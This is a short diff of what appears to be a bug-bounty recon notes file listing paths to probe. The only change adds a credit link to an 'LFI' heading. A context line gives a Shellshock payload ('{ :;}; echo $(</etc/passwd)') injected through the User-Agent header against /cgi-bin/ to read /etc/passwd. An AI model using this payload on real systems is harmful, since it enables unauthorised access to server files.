@@ -13,7 +13,7 @@ html:<URI>
 /wp-admin
 /wp/
 
-# LFI
+# LFI credit https://twitter.com/hemanth1261/status/1265691520495017984?s=21
 /cgi-bin/ // crawl w burp, check "GET /cgi-bin/status", send to repeater, replace user agent with { :;}; echo $(</etc/passwd)
 
 # Sensitive info disclosure
